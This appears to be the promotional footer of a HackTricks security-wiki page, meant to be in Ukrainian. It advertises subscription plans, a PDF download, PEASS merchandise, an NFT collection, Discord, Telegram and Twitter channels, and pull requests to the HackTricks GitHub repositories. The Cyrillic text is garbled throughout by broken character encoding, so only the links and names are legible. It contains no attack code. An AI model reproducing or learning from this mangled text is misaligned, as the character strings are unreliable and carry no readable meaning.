* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
